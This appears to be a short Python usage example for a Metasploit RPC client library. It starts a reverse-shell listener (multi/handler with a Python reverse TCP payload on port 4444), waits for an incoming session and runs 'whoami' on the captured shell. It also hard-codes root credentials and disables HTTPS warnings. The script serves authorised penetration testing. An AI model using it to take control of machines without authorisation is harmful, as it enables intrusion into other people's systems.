import time

from snek_sploit import MetasploitClient, ModuleType, SessionInformation


def main():
    # Initialize client
    client = MetasploitClient("msf", "root", disable_https_warnings=True)

    # Execute multi/handler module
    execution = client.modules.rpc.execute(
        ModuleType.EXPLOIT, "multi/handler", {"PAYLOAD": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444}
    )

    # Wait for a session
    session_to_match = SessionInformation(exploit_uuid=execution.uuid)
    while (sessions := client.sessions.filter(session_to_match)) is None:
        time.sleep(1)

    # Get shell
    shell = client.sessions.get(list(sessions.keys())[-1])

    # Execute in shell
    result = shell.execute("whoami")
    print(result)


if __name__ == "__main__":
    main()
